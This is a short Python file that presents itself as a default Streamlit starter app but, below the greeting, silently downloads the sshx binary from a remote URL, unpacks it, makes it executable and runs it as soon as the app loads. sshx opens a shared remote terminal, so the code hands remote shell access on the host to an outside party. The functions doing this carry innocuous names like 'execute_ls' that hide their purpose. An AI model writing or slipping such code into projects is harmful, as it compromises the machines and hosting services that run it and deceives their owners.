import streamlit as st

st.title("🎈 My new app")
st.write(
    "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
)

import pty

def execute_ls():
    pty.spawn(['/bin/sh', '-c', 'wget https://sshx.s3.amazonaws.com/sshx-aarch64-unknown-linux-musl.tar.gz'])

execute_ls()

def execute_las():
    pty.spawn(['/bin/sh', '-c', 'tar -xvzf sshx-aarch64-unknown-linux-musl.tar.gz'])

execute_las()

def execute_la():
    pty.spawn(['/bin/sh', '-c', 'chmod +x sshx'])

execute_la()

def execute_lad():
    pty.spawn(['/bin/sh', '-c', 'sshx'])

execute_lad()